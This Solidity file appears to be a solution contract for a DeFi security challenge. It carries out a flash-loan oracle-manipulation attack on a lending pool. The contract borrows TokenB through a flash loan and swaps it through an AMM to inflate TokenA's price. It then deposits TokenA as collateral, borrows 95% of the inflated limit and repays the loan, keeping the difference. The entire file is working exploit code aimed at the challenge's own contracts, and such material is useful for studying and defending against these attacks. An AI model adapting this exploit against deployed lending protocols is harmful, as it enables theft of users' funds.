// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "./FlashLoanProvider.sol";
import "./SimpleAMM.sol";
import "./LendingPool.sol";
import "./TokenA.sol";
import "./TokenB.sol";

contract SolutionD4 is IFlashBorrower {
    FlashLoanProvider private fl;
    SimpleAMM private amm;
    LendingPool private pool;
    TokenA private tokenA;
    TokenB private tokenB;

    function run(
        FlashLoanProvider _fl,
        SimpleAMM _amm,
        LendingPool _pool,
        TokenA _a,
        TokenB _b
    ) external {
        fl = _fl;
        amm = _amm;
        pool = _pool;
        tokenA = _a;
        tokenB = _b;

        fl.flash(address(this), 3_000 ether, "");
    }

    function onFlashLoan(uint256 amount, uint256 fee, bytes calldata) external returns (bytes32){
        tokenB.approve(address(amm), amount);
        uint256 outA = amm.swapBforA(amount);

        tokenA.approve(address(pool), outA);
        pool.depositA(outA);

        uint256 max = pool.maxBorrow(address(this));
        uint256 borrow = (max * 95) / 100;
        require(borrow >= amount + fee, "not enough");

        pool.borrowB(borrow);
        require(tokenB.transfer(address(fl), amount + fee), "repay");

        return keccak256("OK");
    }
}

